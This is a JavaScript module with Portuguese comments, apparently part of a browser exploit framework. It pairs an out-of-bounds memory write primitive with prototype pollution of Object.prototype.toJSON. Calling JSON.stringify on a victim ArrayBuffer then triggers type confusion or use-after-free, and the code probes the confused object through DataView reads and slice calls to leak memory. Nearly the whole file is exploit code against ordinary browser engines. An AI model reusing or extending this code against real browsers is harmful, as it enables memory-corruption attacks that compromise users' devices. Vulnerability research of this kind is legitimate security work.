// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TARGETED_UAF_TC_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_for_UAF_TC_test = 0;
const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; 

// Nome da função atualizado para refletir a nova lógica "agressiva"
export function detailed_toJSON_ForceArrayBufferOps() { 
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_ForceABOps(Call ${currentCallCount_for_UAF_TC_test})`;

    if (currentCallCount_for_UAF_TC_test === 1) {
        document.title = `detailed_toJSON_ForceABOps Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        logS3(`[toJSON Poluído - Forçando AB Ops] ${FNAME_toJSON_local} Chamado!`, "vuln");
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    }

    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Profundidade Máx Atingida (${MAX_toJSON_DEPTH_FOR_ANALYSIS})`;
        }
        return undefined; 
    }

    let details = { 
        type_toString: "N/A",
        // Campos para a lógica original
        original_byteLength: "N/A", 
        original_first_dword: "N/A", 
        original_slice_exists: "N/A",
        original_slice_called: "N/A",
        // Campos para a tentativa forçada
        forced_byteLength_access: "N/A",
        forced_byteLength_value: "N/A",
        forced_byteLength_type: "N/A",
        forced_dataview_attempt: "Não tentado",
        forced_dataview_dword: "N/A",
        forced_slice_attempt: "Não tentado",
        forced_slice_result: "N/A"
    };
    let error_during_probing = null;

    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        
        // Lógica original de probing (Call 1 principalmente)
        try {
            details.original_byteLength = currentOperationThis.byteLength;
            if (currentOperationThis && typeof details.original_byteLength === 'number' && details.original_byteLength >= 4) {
                if (currentOperationThis instanceof ArrayBuffer) {
                    details.original_first_dword = new DataView(currentOperationThis, 0, 4).getUint32(0, true);
                } else if (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined && (currentOperationThis.buffer.byteLength >= currentOperationThis.byteOffset + 4)) {
                    details.original_first_dword = new DataView(currentOperationThis.buffer, currentOperationThis.byteOffset, 4).getUint32(0, true);
                }
            }
            details.original_slice_exists = (typeof currentOperationThis.slice === 'function');
            if (details.original_slice_exists && currentOperationThis instanceof ArrayBuffer && currentCallCount_for_UAF_TC_test === 1) {
                details.original_slice_called = `Tentado: Retornou ${currentOperationThis.slice(0,1)?.byteLength}b`;
            }
        } catch (e_orig_probe) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO no probing original: ${e_orig_probe.message}`, "warn");
            error_during_probing = error_during_probing || e_orig_probe.message;
        }

        // Nova Lógica: Forçar operações de ArrayBuffer em 'this' (especialmente para calls > 1)
        if (currentCallCount_for_UAF_TC_test > 1) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] --- Forçando Operações de ArrayBuffer em 'this' (tipo atual: ${details.type_toString}) ---`, "warn");
            
            // 1. Tentar ler byteLength
            details.forced_byteLength_access = "Tentado";
            try {
                details.forced_byteLength_value = currentOperationThis.byteLength;
                details.forced_byteLength_type = typeof details.forced_byteLength_value;
                logS3(`    [FORÇADO] this.byteLength: ${details.forced_byteLength_value} (tipo: ${details.forced_byteLength_type})`, "leak");
            } catch (e_f_bl) {
                logS3(`    [FORÇADO] ERRO ao ler this.byteLength: ${e_f_bl.message}`, "error");
                details.forced_byteLength_access += `, ERRO: ${e_f_bl.message}`;
                error_during_probing = error_during_probing || e_f_bl.message;
            }

            // 2. Tentar criar DataView DIRETAMENTE em currentOperationThis
            details.forced_dataview_attempt = "Tentado";
            // Só tentar se o byteLength forçado parecer um número razoável, mesmo que o tipo não seja ArrayBuffer
            if (details.forced_byteLength_value !== undefined && typeof details.forced_byteLength_value === 'number' && details.forced_byteLength_value >= 4) {
                logS3(`    [FORÇADO] Tentando new DataView(this, 0, 4) pois forced_byteLength é ${details.forced_byteLength_value}...`, "warn");
                try {
                    details.forced_dataview_dword = new DataView(currentOperationThis, 0, 4).getUint32(0, true);
                    logS3(`    [FORÇADO] Leitura de DWORD de 'this' (DataView): ${toHex(details.forced_dataview_dword)}`, "leak");
                    details.forced_dataview_attempt += ", DataView OK";
                } catch (e_f_dv) {
                    logS3(`    [FORÇADO] ERRO ao criar/usar DataView em 'this': ${e_f_dv.message}`, "error");
                    details.forced_dataview_attempt += `, ERRO DataView: ${e_f_dv.message}`;
                    error_during_probing = error_during_probing || e_f_dv.message;
                }
            } else {
                 details.forced_dataview_attempt += ", byteLength forçado não numérico ou pequeno.";
            }

            // 3. Tentar chamar slice DIRETAMENTE em currentOperationThis
            details.forced_slice_attempt = "Tentado";
            if (typeof currentOperationThis.slice === 'function') { // Verifica se 'slice' ainda existe como função
                 logS3(`    [FORÇADO] 'this.slice' existe. Tentando chamar this.slice(0,1)...`, "warn");
                try {
                    let slice_res = currentOperationThis.slice(0,1);
                    details.forced_slice_result = `OK, tipo resultado: ${typeof slice_res}, resultado?.byteLength: ${slice_res?.byteLength}`;
                    logS3(`    [FORÇADO] this.slice(0,1) OK. Result type: ${typeof slice_res}, byteLength: ${slice_res?.byteLength}`, "leak");
                } catch (e_f_sl) {
                    logS3(`    [FORÇADO] ERRO ao chamar this.slice(0,1): ${e_f_sl.message}`, "error");
                    details.forced_slice_result = `ERRO: ${e_f_sl.message}`;
                    error_during_probing = error_during_probing || e_f_sl.message;
                }
            } else {
                 details.forced_slice_attempt += ", 'slice' não é uma função neste 'this'.";
            }
        }
        
        // Log final consolidado da chamada
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Log Detalhes: type='${details.type_toString}'\n` +
              `    Orig: byteLength=${details.original_byteLength}, dword=${(details.original_first_dword === "N/A" || typeof details.original_first_dword === 'string') ? details.original_first_dword : toHex(details.original_first_dword)}, sliceExists=${details.original_slice_exists}, sliceCalled=${details.original_slice_called}\n` +
              `    Forced: byteLengthVal=${details.forced_byteLength_value} (type:${details.forced_byteLength_type}, access:${details.forced_byteLength_access}), dwordVal=${(details.forced_dataview_dword === "N/A" || typeof details.forced_dataview_dword === 'string') ? details.forced_dataview_dword : toHex(details.forced_dataview_dword)} (attempt:${details.forced_dataview_attempt}), sliceAttempt=${details.forced_slice_attempt} (result:${details.forced_slice_result})`, "info");
        
    } catch (e_general) { 
        error_during_probing = e_general.message;
        logS3(`  [toJSON Poluído - Forçando AB Ops] ${FNAME_toJSON_local} ERRO GERAL: ${e_general.message}`, "critical");
        document.title = `ERRO GERAL toJSON Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (error_during_probing) {
        return { toJSON_force_op_error: true, message: error_during_probing, call: currentCallCount_for_UAF_TC_test, details_at_error: details };
    }
    return { toJSON_executed_force_ab_ops: true, call: currentCallCount_for_UAF_TC_test, details: details };
}

export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset, 
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TARGETED_UAF_TC_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (Forçando AB Ops): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor OOB: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC ForceABOps: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0; 

    let stringifyResult = null; 
    let errorOccurredInStringify = false;
    let potentiallyFroze = true; 
    let stepReached = "inicio";

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true; 
    
    try {
        logS3(`Aplicando PP com detailed_toJSON_ForceArrayBufferOps...`, "info", FNAME_TEST);
        stepReached = "aplicando_pp";
        document.title = `Aplicando PP ForceABOps: ${testVariantDescription}`;
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_ForceArrayBufferOps, 
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído com toJSON ForceABOps.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada ForceABOps: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB ForceABOps: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB ForceABOps: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify";
        document.title = `Antes Stringify ForceABOps: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou ForceABOps: ${testVariantDescription}`;
            potentiallyFroze = false; 
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 500)}`, "info", FNAME_TEST);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_force_op_error:true")) {
                logS3("UAF/TC DETECTADO: Erro ao forçar operação dentro do toJSON.", "vuln", FNAME_TEST);
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}) ForceABOps: ${testVariantDescription}`;
            potentiallyFroze = false; 
            errorOccurredInStringify = true;
            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal ForceABOps: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredInStringify = true; 
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) { 
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredInStringify) {
        document.title = `Teste UAF/TC ForceABOps OK: ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}
